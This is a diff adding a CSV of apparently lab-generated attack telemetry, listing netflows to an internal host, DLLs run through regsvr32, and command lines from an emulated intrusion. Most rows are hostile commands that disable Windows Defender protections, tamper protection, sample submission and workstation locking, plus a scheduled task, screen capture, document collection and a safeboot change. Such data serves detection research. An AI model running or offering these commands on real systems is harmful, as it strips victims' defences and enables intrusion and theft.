@@ -1,0 +1,77 @@
+1c46604d-5a5d-4513-aad3-7af51ffaf483,{'netflow': '10.0.2.15:41675->192.168.56.101:47138'},1
+0add1392-7dbe-4dcd-af1c-c5ab36b718c7,{'netflow': '10.0.2.15:41931->192.168.56.101:47138'},2
+aa5de6d2-6938-4eb8-a6ae-6307fa5176ef,{'netflow': '10.0.2.15:42187->192.168.56.101:47138'},3
+efc9dd0d-d73a-488f-aa69-1141a744093c,{'netflow': '10.0.2.15:43723->192.168.56.101:47138'},4
+88fc6fa9-e3bc-4d99-9919-87a667b62704,{'netflow': '10.0.2.15:43979->192.168.56.101:47138'},5
+986faf5f-8a92-4fa7-89ea-f057f775f1ff,{'netflow': '10.0.2.15:45259->192.168.56.101:47138'},6
+6d1efeeb-4116-4289-a100-4d2abb8bef79,{'netflow': '10.0.2.15:45515->192.168.56.101:47138'},7
+09f12445-947b-467f-9bc7-d3f29d50872b,{'netflow': '192.168.56.102:46795->192.168.56.101:47138'},8
+491190d8-ccc2-4632-b0e2-3d88b048fdaf,{'netflow': '192.168.56.102:10700->192.168.56.101:16415'},9
+a1154094-4bd7-4174-a380-fa665d939f57,{'netflow': '192.168.56.102:10956->192.168.56.101:16415'},10
+6cedad66-156e-4745-a0c1-7123f1aa25ee,{'netflow': '192.168.56.102:15820->192.168.56.101:16415'},11
+acaa443c-b329-4a8b-92dc-3d40e8799636,{'netflow': '192.168.56.102:16076->192.168.56.101:16415'},12
+ef3970c7-f31b-4cab-bca6-a10027ebd376,{'netflow': '192.168.56.102:16332->192.168.56.101:16415'},13
+d74cb6f2-2dcc-462a-8f8a-d0f4c9af91f6,{'netflow': '192.168.56.102:21452->192.168.56.101:16415'},14
+c3053dce-a20e-4f88-86b7-8caca018eb4c,{'netflow': '192.168.56.102:29900->192.168.56.101:16415'},15
+131213c1-4799-4ae9-b348-ca1623f07bfa,{'netflow': '192.168.56.102:32204->192.168.56.101:16415'},16
+bce02b9e-8f79-4adb-84f1-3580554c4408,{'netflow': '192.168.56.102:35020->192.168.56.101:16415'},17
+b1d533bc-5cd1-4c93-8a54-3b69d600f177,{'netflow': '192.168.56.102:36812->192.168.56.101:47138'},18
+a8677a18-b829-4e09-89e5-4ef5fbd924ab,{'netflow': '192.168.56.102:40140->192.168.56.101:16415'},19
+57fffe0b-c8f0-4753-9858-271b36eda0a2,{'netflow': '192.168.56.102:40396->192.168.56.101:16415'},20
+cb8b87f1-e8b2-455b-ac7f-85bb15dcb81c,{'netflow': '192.168.56.102:40652->192.168.56.101:16415'},21
+3b6178ca-7d80-4776-a04c-28bffd07a294,{'netflow': '192.168.56.102:41932->192.168.56.101:47138'},22
+aeae30dc-4dff-4489-ba69-4a5ad7c04439,{'netflow': '192.168.56.102:42444->192.168.56.101:16415'},23
+ccf2151e-1d8a-46a0-8788-a03fc383b257,{'netflow': '192.168.56.102:42700->192.168.56.101:16415'},24
+0818d621-8b20-4eee-a0aa-3830a221b57e,{'netflow': '192.168.56.102:42956->192.168.56.101:16415'},25
+24b63f59-aa48-4639-b6bd-0ff468bbe8de,{'netflow': '192.168.56.102:47564->192.168.56.101:47138'},26
+8f4d427e-26a0-4a26-93f0-8684a96aece6,{'file': 'C:\\Users\\victim\\Downloads\\RESPECTIVE_FRATRICIDE.dll'},27
+46301063-ad0a-4205-88bb-7740bafcc34a,{'subject': '"C:\\Windows\\system32\\regsvr32.exe" .\\RESPECTIVE_FRATRICIDE.dll'},28
+f4fca7a6-1b35-4964-bf2b-63308f2dbaf3,{'file': 'C:\\Users\\victim\\Downloads\\LIBERAL_RATE.dll'},29
+2f1554d7-9d5b-4c5b-88f3-6f012abf69ad,{'subject': '"C:\\Windows\\system32\\regsvr32.exe" .\\LIBERAL_RATE.dll'},30
+38760240-b1a1-4662-b6d6-78ca90ab311a,{'subject': 'cmd.exe /c "arp -a"'},31
+ced92ba5-4a61-4ec9-9756-7dce13a1d62f,{'subject': 'powershell.exe -Command Get-Process'},32
+fd2916ef-8ab5-48ff-a12a-0f2e4005cf20,{'subject': 'cmd.exe /c "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 1636"'},33
+f070e313-489d-4c15-9677-dfc0c613c59e,{'subject': 'powershell.exe -Command "Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width'},34
+f357de1d-6fb5-43b6-9025-3f6ff15608ee,{'subject': 'powershell.exe -Command "$startingDirectory=\\"C:\\"; $outputZip=\\"#{output_zip_folder_path}\\"; $fileExtensions=@(\\".doc\\"'},35
+f3316c78-2b0e-4497-b0e6-e3e33af0f33c,{'subject': 'cmd.exe /c "bcdedit /set safeboot network"'},36
+ac0faf31-3c37-479e-9e34-e410ba3b6787,{'subject': 'cmd.exe /c "reg add \\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\\" /v \\"DisableSecuritySettings\\" /t REG_DWORD /d 1 /f"'},37
+9dd3910e-2d36-4ae6-933b-d7cc39f70caa,{'subject': 'reg  add \\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\\" /v \\"DisableSecuritySettings\\" /t REG_DWORD /d 1 /f'},38
+80df422d-d894-4601-9cfb-aecb3f5a324c,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableRealtimeMonitoring\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},39
+05ebbbe0-c13f-4fd0-a534-07fd80b30a30,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableRealtimeMonitoring\\" /t REG_DWORD /d \\"1\\" /f '},40
+fba28df8-d889-46d9-8981-216081d20a57,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableBehaviorMonitoring\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},41
+cf696402-1a5a-46a8-a3e4-8473554e22bf,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableBehaviorMonitoring\\" /t REG_DWORD /d \\"1\\" /f '},42
+15cabc6a-1785-47d8-b395-c60cd9d21274,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableScriptScanning\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},43
+f801c8a1-f0f3-408c-aca6-319deb728738,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableScriptScanning\\" /t REG_DWORD /d \\"1\\" /f '},44
+50238611-7765-4e0f-ae5b-395138df0f9d,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\\" /v \\"DisableBlockAtFirstSeen\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},45
+19ef970b-9d3e-42e5-81b7-b3a028fe722e,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\\" /v \\"DisableBlockAtFirstSeen\\" /t REG_DWORD /d \\"1\\" /f '},46
+78a3c30c-35d2-447a-869f-df29169464f0,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\" /v \\"DisableAntiSpyware\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},47
+138d3cc0-ac81-4b41-9560-969c5850feda,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\" /v \\"DisableAntiSpyware\\" /t REG_DWORD /d \\"1\\" /f '},48
+ea3e811b-4315-4927-86eb-427dbf4be5a8,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\" /v \\"DisableAntiVirus\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},49
+5b38ec9f-1ed8-4a63-9902-f739fed0ef2c,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\" /v \\"DisableAntiVirus\\" /t REG_DWORD /d \\"1\\" /f '},50
+f7596bd4-7018-479c-bf37-4c3fda7dea9e,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableIntrusionPreventionSystem\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},51
+caf938b7-5235-4c48-a16c-56cdb62beb43,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableIntrusionPreventionSystem\\" /t REG_DWORD /d \\"1\\" /f '},52
+0f08f56b-7629-4ee0-9c9e-b156a3b10d08,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableIOAVProtection\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},53
+a479427b-cc52-434a-a70d-5a26a33d5116,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableIOAVProtection\\" /t REG_DWORD /d \\"1\\" /f '},54
+c9c16682-41bb-4301-84cc-0b0f6c0226fb,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableOnAccessProtection\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},55
+312e7a8f-0619-4fee-9f91-5e60b2339a1f,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableOnAccessProtection\\" /t REG_DWORD /d \\"1\\" /f '},56
+1aa39c9a-f869-4e07-b8ce-297dc221d97b,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableRoutinelyTakingAction\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},57
+0b7a30ac-b2d2-452d-aa11-1cd2809357e3,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableRoutinelyTakingAction\\" /t REG_DWORD /d \\"1\\" /f '},58
+0d4831fd-26e0-43a0-8a00-3f7bbbcaa7ff,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableScanOnRealtimeEnable\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},59
+8776cc44-775b-4615-a5bf-83b134d1a44e,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableScanOnRealtimeEnable\\" /t REG_DWORD /d \\"1\\" /f '},60
+923d4a34-83a3-44ee-ace9-1ae5b74272f3,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\\" /v \\"DisableEnhancedNotifications\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},61
+6068a0cb-cf59-4635-ac02-6cf0b943bc01,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\\" /v \\"DisableEnhancedNotifications\\" /t REG_DWORD /d \\"1\\" /f '},62
+b037d680-9912-4b19-a0f9-946a0c0ffa75,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\\" /v \\"SpynetReporting\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},63
+27b8d0eb-0426-46c7-a459-57c011e9c2f8,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\\" /v \\"SpynetReporting\\" /t REG_DWORD /d \\"0\\" /f '},64
+51700c67-71c7-40a9-9f57-e9c5484c9c44,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\\" /v \\"MpEnablePus\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},65
+774ec47e-1c82-46d4-ae1f-30f1ae3e7046,{'subject': 'reg  add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\\" /v \\"MpEnablePus\\" /t REG_DWORD /d \\"0\\" /f '},66
+a6a2a33d-7cd2-446d-8bc2-a01eeca23561,{'subject': 'cmd.exe /c "reg add \\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\" /v \\"DisallowExploitProtectionOverride\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},67
+e3fbebb3-e772-4964-8d27-f4f7785ba004,{'subject': 'reg  add \\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\" /v \\"DisallowExploitProtectionOverride\\" /t REG_DWORD /d \\"0\\" /f '},68
+3ac6b781-1eb9-466a-b98b-76513e37d20e,{'subject': 'cmd.exe /c "reg add \\"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\" /v \\"TamperProtection\\"  /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},69
+45cfea18-1941-47f3-a5b3-9d2943ef5e14,{'subject': 'reg  add \\"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\" /v \\"TamperProtection\\"  /t REG_DWORD /d \\"0\\" /f '},70
+f26e1538-3a6a-4a1d-960f-9a0286e27643,{'subject': 'cmd.exe /c "reg add \\"HKLM\\software\\microsoft\\windows defender\\spynet\\" /v \\"SubmitSamplesConsent\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},71
+a58926b7-944e-448d-af0a-1f8cf40d0812,{'subject': 'reg  add \\"HKLM\\software\\microsoft\\windows defender\\spynet\\" /v \\"SubmitSamplesConsent\\" /t REG_DWORD /d \\"0\\" /f '},72
+23b803ae-c18b-4a2f-a97c-ff86fc56c605,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Microsoft\\Windows Defender\\" /v \\"PUAProtection\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},73
+1e4d9cb6-876e-4f3d-898b-1178f71645f8,{'subject': 'reg  add \\"HKLM\\Software\\Microsoft\\Windows Defender\\" /v \\"PUAProtection\\" /t REG_DWORD /d \\"0\\" /f '},74
+c7c3b044-7d3b-4da0-9d5d-18c90a05fb54,{'subject': 'cmd.exe /c "\\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\\" -RemoveDefinitions -All"'},75
+4d64e987-2d83-4176-95ea-3a51313f2ce2,{'subject': 'cmd.exe /c "reg add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f"'},76
+6c060c42-dbda-4339-8001-aa67e5e7f1d5,{'subject': 'reg  add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f'},77
